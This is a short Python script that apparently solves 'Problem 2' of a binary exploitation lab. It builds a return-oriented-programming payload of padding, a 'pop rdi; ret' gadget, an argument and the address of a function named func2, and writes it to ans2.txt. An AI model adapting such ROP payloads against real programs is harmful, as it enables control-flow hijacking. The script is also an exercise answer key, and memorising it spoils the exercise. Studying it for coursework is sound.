# 1. Padding to Reach Return Address
padding = b"A" * 16

# 2. Gadget: pop rdi; ret
# 注意：0x4012c7 是 pop rdi 的具体位置
pop_rdi = b"\xc7\x12\x40\x00\x00\x00\x00\x00"

# 3. Argument: 0x3f8
arg1 = b"\xf8\x03\x00\x00\x00\x00\x00\x00"

# 4. Target Function: func2
func2_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"

payload = padding + pop_rdi + arg1 + func2_addr

with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Payload for Problem 2 generated.")